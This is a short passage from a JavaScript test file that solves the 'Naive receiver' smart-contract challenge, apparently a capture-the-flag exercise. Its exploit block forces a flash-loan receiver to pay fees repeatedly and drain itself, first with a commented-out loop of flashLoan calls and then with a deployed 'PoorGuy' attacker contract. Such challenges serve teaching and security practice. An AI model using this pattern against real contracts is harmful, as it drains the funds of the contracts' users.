...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        let i = 0
        while (i < 10) {
            await this.pool.connect(attacker).flashLoan(this.receiver.address, await ethers.utils.parseEther("10"));
            i++
        };
        */
        // Yes big plus
        const PoorGuyFactory = await ethers.getContractFactory("PoorGuy", attacker);
        this.killer = await PoorGuyFactory.deploy(this.receiver.address, this.pool.address);
        this.killer.killSheep();
    });
